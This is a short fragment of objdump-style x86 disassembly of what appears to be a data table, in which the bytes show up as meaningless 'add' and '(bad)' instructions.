  40238d:	00 00                	add    %al,(%eax)
  40238f:	00 42 00             	add    %al,0x0(%edx)
  402392:	00 00                	add    %al,(%eax)
  402394:	ff                   	(bad)
  402395:	ff                   	(bad)
  402396:	ff                   	(bad)
  402397:	ff 01                	incl   (%ecx)
  402399:	00 00                	add    %al,(%eax)
  40239b:	00 43 00             	add    %al,0x0(%ebx)
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	ff                   	(bad)
  4023a1:	ff                   	(bad)
  4023a2:	ff                   	(bad)
  4023a3:	ff 01                	incl   (%ecx)
  4023a5:	00 00                	add    %al,(%eax)
  4023a7:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4023ab:	00 ff                	add    %bh,%bh
  4023ad:	ff                   	(bad)
  4023ae:	ff                   	(bad)
  4023af:	ff 01                	incl   (%ecx)
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	00 31                	add    %dh,(%ecx)
  4023b5:	00 00                	add    %al,(%eax)
	...
